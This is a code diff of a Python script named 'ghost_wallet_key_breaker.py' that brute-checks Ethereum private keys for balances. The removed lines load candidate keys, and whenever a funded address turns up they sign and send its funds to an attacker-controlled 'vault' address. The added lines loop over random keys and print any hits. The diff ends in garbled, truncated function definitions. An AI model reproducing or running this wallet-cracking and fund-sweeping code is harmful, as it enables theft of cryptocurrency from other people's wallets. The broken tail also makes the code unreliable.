@@ -1,60 +1,36 @@
+from ghost_env import INFURA_KEY, VAULT_ADDRESS
 # === FILE: ghost_wallet_key_breaker.py ===
-# 👻 GHOST WALLET KEY BREAKER
-# Attempts wallet loads from entropy, checks balances.
+# 👻 Attempts random private keys to brute-check Ethereum balances.
 
-import json
+import os
 import time
-from datetime import datetime
-from web3 import Web3
+from web3 import Web3, HTTPProvider
+from eth_account import Account
+from dotenv import load_dotenv
 
-CHAOS_FILE = "ghost_chaos.json"
-LOGBOOK_FILE = "vault_logbook.txt"
-WEB3_PROVIDER = "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"
+load_dotenv()
+INFURA_KEY = os.getenv("INFURA_KEY")
+VAULT_ADDRESS = os.getenv("VAULT_ADDRESS")
 
-w3 = Web3(Web3.HTTPProvider(WEB3_PROVIDER))
-vault_address = "0xYOUR_VAULT_ADDRESS"  # Where to send found funds
+if not INFURA_KEY or not VAULT_ADDRESS:
+    print("[FATAL] Missing INFURA_KEY or VAULT_ADDRESS in .env!")
+    exit(1)
 
-def log_action(message):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(LOGBOOK_FILE, "a") as f:
-        f.write(f"[{timestamp}] {message}\n")
+print(f"[key_breaker] 👻 Loaded .env with INFURA_KEY={INFURA_KEY[:6]}... VAULT={VAULT_ADDRESS[:8]}...")
 
-def load_entropy():
-    try:
-        with open(CHAOS_FILE, "r") as f:
-            return json.load(f)
-    except FileNotFoundError:
-        return []
+w3 = Web3(HTTPProvider(f"https://mainnet.infura.io/v3/{INFURA_KEY}"))
 
-def try_keys(entropy):
-    for key in entropy:
-        acct = w3.eth.account.from_key(key)
-        balance = w3.eth.get_balance(acct.address)
-        eth_balance = w3.from_wei(balance, 'ether')
-        if eth_balance > 0:
-            log_action(f"[ghost_wallet_key_breaker] 🚀 FOUND BALANCE {eth_balance} ETH on {acct.address}")
-            move_funds(acct, eth_balance)
-        else:
-            log_action(f"[ghost_wallet_key_breaker] 🥀 Tried {acct.address}, empty.")
+def try_key():
+    acct = Account.create()
+    balance = w3.eth.get_balance(acct.address)
+    if balance > 0:
+        print(f"[key_breaker] 💰 FOUND! Address {acct.address} with {w3.fromWei(balance, 'ether')} ETH")
+    else:
+        print(f"[key_breaker] ❌ Tried {acct.address[:8]}... balance 0")
 
-def move_funds(account, amount):
-    tx = {
-        "to": vault_address,
-        "value": w3.to_wei(amount * 0.99, "ether"),
-        "gas": 21000,
-        "gasPrice": w3.to_wei("50", "gwei"),
-        "nonce": w3.eth.get_transaction_count(account.address)
-    }
-    signed = w3.eth.account.sign_transaction(tx, private_key=account.key)
-    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
-    log_action(f"[ghost_wallet_key_breaker] 💰 Moved funds to vault: {tx_hash.hex()}")
+while True:
+    try_key()
+    time.sleep(1)
 
-def main():
-    print("[ghost_wallet_key_breaker] 👻 Running key breaker...")
-    while True:
-        entropy = load_entropy()
-        try_keys(entropy)
-        time.sleep(20)
-
-if __name__ == "__main__":
-    main()
+def log_event():ef mutate(*args, **kwargs): print('[ghost_empire] dummy mutate called')
+def drop_files_to_bridge():
